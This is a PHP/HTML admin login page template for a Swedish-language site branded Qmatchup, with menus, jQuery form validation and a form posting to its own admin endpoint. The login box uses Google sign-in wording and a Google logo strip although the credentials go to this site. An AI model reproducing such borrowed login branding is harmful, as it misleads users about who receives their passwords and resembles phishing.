<!doctype html>
<html>

<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
	<meta charset="utf-8">
	<link rel="shortcut icon" type="image/x-icon" href="../../../usercss/images/favicon.ico">
	<title>Login</title>
	<!-- Styles -->
	<link rel="stylesheet" type="text/css" media="all" href="<?php echo $path; ?>html/vacancycontent/css/style.css" />
	<link rel="stylesheet" type="text/css" media="all" href="<?php echo $path; ?>html/vacancycontent/constructor.css" />
	<link rel="stylesheet" type="text/css" media="all" href="<?php echo $path; ?>html/vacancycontent/responsive.css" />
	<link rel="stylesheet" type="text/css" media="all" href="<?php echo $path; ?>html/vacancycontent/css/modules.css" />
	<script type='text/javascript' src='//platform-api.sharethis.com/js/sharethis.js#property=59d34637d184b0001230f7a1&product=inline-share-buttons' async='async'></script>
	<script type="text/javascript" src="<?php echo $path; ?>html/vacancycontent/js/jquery.js"></script>
	<script>
		var currentLang = 'sv';
		function validateLogin()
{
    
    
    var reg = /^\w+([-+.']\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$/
                                                       
                    if($("#username").val() == "")
					{
						alert("Enter username");
						$("#username").css("background-color","#FF9494");
						return false;
					}
					if (!reg.test($("#username").val())){
                    
                    $("#username").css("background-color","#FF9494");
                    alert("Incorrect Email address format");
                    return false;
                    
                    }
					if($("#password").val() == "" )
                    {
                    $("#password").css("background-color","#FF9494");
					alert("Enter Password");
                    return false;
                    }
					
                    
                    
                    document.getElementById("loginform").submit();
}
	</script>
</head>

<body>
	
	<div class="column_m header header_small bs_bb bg_colorn_new hei_40p " >
		<div class="wi_100 hei_30p xs-pos_fix padtb5 padrl10 bg_colorn_new" >
			<div class="visible-xs visible-sm fleft">
				<a href="#" class="class-toggler dblock bs_bb talc fsz30 dark_grey_txt " data-target="#scroll_menu" data-classes="hidden-xs hidden-sm" data-toggle-type="separate"> <span class="fa fa-bars dblock"></span> </a>
			</div>
			<div class="logo hidden-xs hidden-sm marr15">
				<a href="#"> <img src="<?php echo $path; ?>html/vacancycontent/images/qmatchup_logo_blue2.png" alt="Qmatchup" title="Qmatchup" class="valb" /> </a>
			</div>
			<div class="hidden-xs hidden-sm fleft padl10 padr30">
				<div class="languages">
					<a href="#" id="language_selector" class="padrl10"><img src="<?php echo $path;?>html/vacancycontent/images/slide/flag_sw.png" width="24" height="16" title="US" alt="US" /></a>
					<ul class="wi_100 mar0 pad5 blue_bg">
						<li class="dblock">
							<a href="#" class="pad5" data-lang="eng"><img src="<?php echo $path; ?>html/vacancycontent/images/slide/flag_sw.png" width="24" height="16" title="US" alt="US" />
							</a>
						</li>
						<li class="dblock">
							<a href="#" class="pad5" data-lang="swd"><img src="<?php echo $path; ?>html/vacancycontent/images/slide/flag_sw.png" width="24" height="16" title="Sweden" alt="Sweden" />
							</a>
						</li>
					</ul>
				</div>
			</div>
			<div class="search padt1" style="height:28px;">
			<form action="PublicSearchResult" method="POST" id="save_indexing" name="indexing_save" accept-charset="ISO-8859-1">
      <div class="fleft">
        <input type="text" name="message" id="message" class="search_fld hi_wi385" style="height:26px;">
      </div>
      <div class="fleft">
        <input type="button" value="" class="search_btn hi26" style="height:26px;" onclick="submitForm();">
      </div>
	  </form>
    </div>
			<div class="fright xs-dnone sm-dnone">
				<ul class="mar0 pad0">
					<li class="dblock hidden-xs hidden-sm fright pos_rel brdl brdclr_dblue"> <a href="#" id="usermenu_singin" class="translate hei_30pi dblock padrl25 blue_bg_h uppercase lgn_hight_30 white_txt white_txt_h" data-en="Logga In" data-sw="Logga In">Logga IN</a> </li>
				</ul>
			</div>
			<div class="top_menu top_menu_custom mart2">
				<ul class="menulist">
					<li class="xs-mar0i sm-mar0i">
						<a href="#" class="class-toggler" data-target="#menulist-dropdown,#menulist-fade" data-classes="active" data-toggle-type="separate"> <span class="fa fa-qrcode white_txt fsz20"></span> </a>
						<ul class="dblocki_a" id="menulist-dropdown">
							<li>
								<div class="top_arrow"></div>
							</li>
							<li>
								<!-- MAIN -->
								<div class="tab-content application_menu pad20" id="tab-main">
									<ol class="tab-header">
										<li>
											<a href="#" data-id="tab-per" class="business_prof">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/dropbox icons/folder.png" width="45" height="45" title="" alt="" />
												</div>Personal</a>
										</li>
										<li>
											<a href="#" data-id="tab-bus" class="swedBank">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/dropbox icons/folder.png" width="45" height="45" title="" alt="" />
												</div>Business</a>
										</li>
									</ol>
									<div class="clear"></div>
								</div>
								<!-- PERSONAL -->
								<div class="tab-content application_menu pad20" id="tab-per">
									<ol>
										<li>
											<a href="#" class="business_prof">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/product icons/icon-1.png" width="45" height="45" title="" alt="" />
												</div>Cloud ID</a>
										</li>
										<li>
											<a href="#" class="swedBank">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/product icons/icon-2.png" width="45" height="45" title="" alt="" />
												</div>Verify</a>
										</li>
										<li>
											<a href="#" class="posted_jobs">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/product icons/icon-3.png" width="45" height="45" title="" alt="" />
												</div>Activate</a>
										</li>
									</ol>
									<div class="padb20">
										<div class="line"></div>
									</div>
									<div class="column_m tab-header"> <a href="#" class="contractor_btn" data-id="tab-main"><span></span> Back to Business</a> </div>
									<div class="clear"></div>
								</div>
								<!-- BUSINESS -->
								<div class="tab-content application_menu pad20" id="tab-bus">
									<ol class="tab-header">
										<li>
											<a href="#" data-id="tab-bus-cld" class="business_prof">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/dropbox icons/folder.png" width="45" height="45" title="" alt="" />
												</div>Cloud ID</a>
										</li>
										<li>
											<a href="#" data-id="tab-bus-vrf" class="swedBank">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/dropbox icons/folder.png" width="45" height="45" title="" alt="" />
												</div>Verify</a>
										</li>
										<li>
											<a href="#" data-id="tab-bus-act" class="posted_jobs">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/dropbox icons/folder.png" width="45" height="45" title="" alt="" />
												</div>Activate</a>
										</li>
										<li>
											<a href="#" data-id="tab-bus-eng" class="proposals">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/dropbox icons/folder.png" width="45" height="45" title="" alt="" />
												</div>Engage </a>
										</li>
									</ol>
									<div class="padb20">
										<div class="line"></div>
									</div>
									<div class="column_m tab-header"> <a href="#" class="contractor_btn" data-id="tab-main"><span></span> Back to Qmatchup</a> </div>
									<div class="clear"></div>
								</div>
								<!-- Cloud ID -->
								<div class="tab-content application_menu pad20" id="tab-bus-cld">
									<ol>
										<li>
											<a href="#" class="business_prof">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/product icons/icon-4.png" width="45" height="45" title="" alt="" />
												</div>Business</a>
										</li>
										<li>
											<a href="#" class="swedBank">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/product icons/icon-5.png" width="45" height="45" title="" alt="" />
												</div>Employees</a>
										</li>
									</ol>
									<div class="padb20">
										<div class="line"></div>
									</div>
									<div class="column_m tab-header"> <a href="#" class="contractor_btn" data-id="tab-bus"><span></span> Back to Business</a> </div>
									<div class="clear"></div>
								</div>
								<!-- Verify -->
								<div class="tab-content application_menu pad20" id="tab-bus-vrf">
									<ol>
										<li>
											<a href="#" class="business_prof">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/product icons/icon-6.png" width="45" height="45" title="" alt="" />
												</div>Basic - Free</a>
										</li>
										<li>
											<a href="#" class="swedBank">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/product icons/icon-7.png" width="45" height="45" title="" alt="" />
												</div>Full - Paid</a>
										</li>
									</ol>
									<div class="padb20">
										<div class="line"></div>
									</div>
									<div class="column_m tab-header"> <a href="#" class="contractor_btn" data-id="tab-bus"><span></span> Back to Business</a> </div>
									<div class="clear"></div>
								</div>
								<!-- Activate -->
								<div class="tab-content application_menu pad20" id="tab-bus-act">
									<ol class="tab-header">
										<li>
											<a href="#" data-id="tab-bus-act-org" class="business_prof">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/dropbox icons/folder.png" width="45" height="45" title="" alt="" />
												</div>By organization</a>
										</li>
										<li>
											<a href="#" data-id="tab-bus-act-ind" class="swedBank">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/dropbox icons/folder.png" width="45" height="45" title="" alt="" />
												</div>By industry</a>
										</li>
										<li>
											<a href="#" data-id="tab-bus-act-top" class="posted_jobs">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/dropbox icons/folder.png" width="45" height="45" title="" alt="" />
												</div>By topic</a>
										</li>
									</ol>
									<div class="padb20">
										<div class="line"></div>
									</div>
									<div class="column_m tab-header"> <a href="#" class="contractor_btn" data-id="tab-bus"><span></span> Back to Business</a> </div>
									<div class="clear"></div>
								</div>
								<!-- - by organization -->
								<div class="tab-content application_menu pad20 active" id="tab-bus-act-org" style="display: block;">
									<ol>
										<li>
											<a href="#" class="business_prof">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/product icons/icon-8.png" width="45" height="45" title="" alt="" />
												</div>HR Portal</a>
										</li>
										<li>
											<a href="#" class="swedBank">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/product icons/icon-9.png" width="45" height="45" title="" alt="" />
												</div>Sales</a>
										</li>
										<li>
											<a href="#" class="posted_jobs">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/product icons/icon-10.png" width="45" height="45" title="" alt="" />
												</div>Marketing</a>
										</li>
									</ol>
									<div class="padb20">
										<div class="line"></div>
									</div>
									<div class="column_m tab-header"> <a href="#" class="contractor_btn" data-id="tab-bus-act"><span></span> Back to Activate</a> </div>
									<div class="clear"></div>
								</div>
								<!-- - by industry -->
								<div class="tab-content application_menu pad20" id="tab-bus-act-ind">
									<ol>
										<li>
											<a href="#" class="business_prof">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/product icons/icon-11.png" width="45" height="45" title="" alt="" />
												</div>Telemarketing</a>
										</li>
										<li>
											<a href="#" class="swedBank">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/product icons/icon-1.png" width="45" height="45" title="" alt="" />
												</div>Lawyers</a>
										</li>
									</ol>
									<div class="padb20">
										<div class="line"></div>
									</div>
									<div class="column_m tab-header"> <a href="#" class="contractor_btn" data-id="tab-bus-act"><span></span> Back to Activate</a> </div>
									<div class="clear"></div>
								</div>
								<!-- - by topic -->
								<div class="tab-content application_menu pad20" id="tab-bus-act-top">
									<ol>
										<li>
											<a href="#" class="business_prof">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/product icons/icon-2.png" width="45" height="45" title="" alt="" />
												</div>Miljöplus</a>
										</li>
									</ol>
									<div class="padb20">
										<div class="line"></div>
									</div>
									<div class="column_m tab-header"> <a href="#" class="contractor_btn" data-id="tab-bus-act"><span></span> Back to Activate</a> </div>
									<div class="clear"></div>
								</div>
								<!-- Engage -->
								<div class="tab-content application_menu pad20" id="tab-bus-eng">
									<ol>
										<li>
											<a href="#" class="business_prof">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/dropbox icons/folder.png" width="45" height="45" title="" alt="" />
												</div>Employees</a>
										</li>
										<li>
											<a href="#" class="swedBank">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/dropbox icons/folder.png" width="45" height="45" title="" alt="" />
												</div>Customers</a>
										</li>
										<li>
											<a href="#" class="posted_jobs">
												<div><img src="<?php echo $path; ?>html/vacancycontent/images/dropbox icons/folder.png" width="45" height="45" title="" alt="" />
												</div>Suppliers</a>
										</li>
									</ol>
									<div class="padb20">
										<div class="line"></div>
									</div>
									<div class="column_m tab-header"> <a href="#" class="contractor_btn" data-id="tab-bus"><span></span> Back to Business</a> </div>
									<div class="clear"></div>
								</div>
							</li>
						</ul>
					</li>
				</ul>
			</div>
			<div class="visible-xs visible-sm fright marr10 padr10 brdr brdwi_3"> <a href="#" class="diblock padrl20 brdrad3 pred2_bg lgn_hight_29 fsz14 white_txt">Erbjudande</a> </div>
			<div class="clear"></div>
		</div>
	</div><div class="clear"></div>
	<div class="clear"></div>
	
	<!-- LOGIN FORM -->
	<div class="column_m mart0 padtb30 fsz14">
		<div class="wrap maxwi_100">
			
			<div class="container padrl15">
				<h1 class="talc">One account. All of Google.</h1>
				<h3 class="marb10 talc">Sign in with your Google Account</h3>
				<div class="maxwi_320p marrla">
					<div class="marb20 pad10 brd white_bg">
						<form method="POST" action="LoginAdmin/loginAccount" id="loginform" name="loginform">
							<h4 class="mart15 padrl10 bold">Login</h4>
							<div class="on_clmn padtb10">
								<div class="on_clmn padrl10">
									<input type="text" name="username" id="username" placeholder="Login" class="wi_100 pad10 brd logyellow_bg" /> </div>
								<div class="on_clmn padrl10">
									<input type="password" name="password" id="password" placeholder="Password" class="wi_100 pad10 brd nobrdt logyellow_bg" /> 
									<input type="hidden" name="login" >
									</div>
									
									 <?php if(isset($_SESSION['warning'])) {?>
										<h4 style="color: red">
										<?php echo $_SESSION['warning']; ?>
										</h4>
										<?php }?>
										
								<div class="clear"></div>
							</div>
							<!-- * stay signed in / forgot pass -->
							<div class="on_clmn padtb10">
								<div class="tw_clmn padrl10">
									<label class="dblock fsz12">
										<input type="checkbox" name="terms" id="terms" /> <span class="marl5 valm">Stay signed in</span> </label>
								</div>
								<div class="tw_clmn padrl10 talr lgn_hight_18 fsz12"> <a href="../../../forgotpassword.php?page=admin">Forgot Password?</a> </div>
								<div class="clear"></div>
							</div>
							<!-- * submit -->
							<div class="on_clmn padt10">
								<div class="padrl10 talc"> <a href="#" class="dblue_btn min_height" onclick="validateLogin();">Nästa</a> </div>
								<div class="clear"></div>
							</div>
							<div class="clear"></div>
						</form>
					</div>
				</div>
				<div class="marb30 talc"><a href="#">Sign in with a different account</a>
				</div>
				<div class="marb10 talc"><span>One Google Account for everything Google</span>
				</div>
				<div class="talc"><img src="<?php echo $path; ?>html/vacancycontent/images/wlogostrip_230x17_1x.png" />
				</div>
			</div>
		</div>
	</div>
	<div class="clear"></div>
	<script type="text/javascript" src="<?php echo $path; ?>html/vacancycontent/js/jquery-ui.min.js"></script>
	<script type="text/javascript" src="<?php echo $path; ?>html/vacancycontent/js/superfish.js"></script>
	<script type="text/javascript" src="<?php echo $path; ?>html/vacancycontent/js/icheck.js"></script>
	<script type="text/javascript" src="<?php echo $path; ?>html/vacancycontent/js/jquery.selectric.js"></script>
	<script type="text/javascript" src="<?php echo $path; ?>html/vacancycontent/js/custom.js"></script>
</body>
<?php if (isset($_SESSION['warning'])) $_SESSION['warning']=""; ?>
</html>